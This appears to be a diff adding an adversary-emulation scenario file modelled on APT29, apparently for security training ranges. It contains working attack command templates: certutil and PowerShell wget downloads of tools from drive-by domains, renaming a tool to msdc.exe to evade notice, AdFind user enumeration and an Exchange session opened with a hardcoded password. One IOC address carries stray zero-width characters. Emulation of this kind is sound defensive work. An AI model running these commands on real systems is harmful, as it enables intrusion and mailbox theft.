@@ -1,0 +1,542 @@
+{
+    "meta_data": {
+        "name": "apt29_variant2",
+        "version": "v1.0.0",
+        "title": "APT-29 Inspired Scenario Variant 2",
+        "description": "Inspired by APT29. An automated attack meant to emulate an APT actor with the common names Solorigate, SUNBURST, NobleBaron, Dark Halo, StellarParticle, NOBELIUM, UNC2452, YTTRIUM, The Dukes, Cozy Bear, CozyDuke, and APT29. The attack attempts to discover system information and download and execute two attack tools.",
+        "author": "Attack Content",
+        "suggested_duration": 741
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "netbugc.exe",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces3",
+            "preconditions": {
+                "driveby": "self.driveby3"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS3",
+            "preconditions": {
+                "driveby": "self.driveby3"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX3",
+            "preconditions": {
+                "payload": "AdFind.exe",
+                "driveby": "self.driveby3",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "RemoteEmailCollection",
+            "technique": "Collection",
+            "label": "remoteEmailCollection",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "user_mailbox": "self.target_1_username"
+                }
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "fileDirDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('administrator@site', $password); $mailserver = [Net.DNS]::GetHostByAddress([Net.DNS]::GetHostEntry('Autodiscover').AddressList[0]).Hostname; echo $mailserver; $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$mailserver/PowerShell/ -Authentication Kerberos -Credential $Credential; echo $Session; Import-PSSession $Session -DisableNameChecking -AllowClobber; Get-WebServicesVirtualDirectory; echo ' ';}"
+                }
+            }
+        },
+        {
+            "tactic": "PermissionGroupsDiscovery",
+            "technique": "Discovery",
+            "label": "permGroupsDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "RemoteSystemDiscovery",
+            "technique": "Discovery",
+            "label": "remoteSystemDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "ObfuscatedFilesOrInformation",
+            "technique": "DefenseEvasion",
+            "label": "obfsInformation",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "ingressToolTransfer1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c certutil.exe -urlcache -split -f http://",
+                            "self.driveby_domain2",
+                            "/",
+                            "self.tool_name2",
+                            " ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name2",
+                            " && echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "MatchLegitimateNameOrLocation",
+            "technique": "DefenseEvasion",
+            "label": "matchName",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "original_dir": "self.temp_dir_name",
+                    "original_file": "self.tool_name2",
+                    "destination_dir": "self.temp_dir_name",
+                    "destination_file": "msdc.exe"
+                }
+            }
+        },
+        {
+            "tactic": "SoftwarePacking",
+            "technique": "DefenseEvasion",
+            "label": "softwarePacking",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "directory": "self.temp_dir_name",
+                    "file_name": "msdc.exe"
+                }
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "ingressToolTransfer2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{wget -O ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name3",
+                            " http://",
+                            "self.driveby_domain3",
+                            "/",
+                            "self.tool_name3",
+                            "; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "PermissionGroupsDiscovery",
+            "technique": "Discovery",
+            "label": "remoteSystemDiscovery2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "windowsshell ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name3",
+                            " -default -f \"objectcategory=user\" \"cn\"; echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "downloads.solarwinds.com",
+            "appsync-api.eu-west-2.avsvmcloud.com",
+            "onetechcompany.com",
+            "megatoolkit.com",
+            "solartrackingsystem.net",
+            "virtualwebdata.com",
+            "doggroomingnews.com",
+            "digitalcollege.com",
+            "kubecloud.com"
+        ],
+        "ip": [
+            "96.31.172.1/24",
+            "131.228.12.1/24",
+            "144.86.226.1/24",
+            "185.225.69.69/24",
+            "13.57.184.217/24",
+            "13.59.205.66/24",
+            "18.217.225.111/24",
+            "54.193.127.66/24",
+            "54.215.192.52/24",
+            "3.87.182.149\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d\u200d/24"
+        ],
+        "binary": [
+            "gracious_truth.exe",
+            "crmlog.exe",
+            "artifact.exe",
+            "ComputerDefaults.exe",
+            "BOOM.exe",
+            "Canocpc.exe",
+            "SolarWinds.BusinessLayerHost.exe",
+            "Lexicon.exe",
+            "tDiscover.exe"
+        ]
+    },
+    "spec": {
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "90",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "netbugc.exe"
+            },
+            "3": {
+                "name": "AdFind.exe"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "123.35.79.48/24",
+                "ioc-domain_driveby": "foodtourusa.org"
+            },
+            "3": {
+                "ioc-ip_driveby": "43.15.182.201/24",
+                "ioc-domain_driveby": "cdc.healthadvice.com"
+            }
+        },
+        "targets": {
+            "1": {
+                "payload_destination": "C:\\Users\\Public",
+                "ioc-temp_dir": "C:\\Windows\\Tasks"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "tool_name3": {
+                "path": [
+                    "tool",
+                    "3",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby3": {
+                "path": [
+                    "driveby",
+                    "3"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain3": {
+                "path": [
+                    "driveby",
+                    "3",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "temp_dir_name": {
+                "path": [
+                    "targets",
+                    "1",
+                    "ioc-temp_dir"
+                ]
+            },
+            "target_1_domain": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-target_domain"
+                ]
+            },
+            "target_1_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-target_username"
+                ]
+            },
+            "target_1_password": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-target_password"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
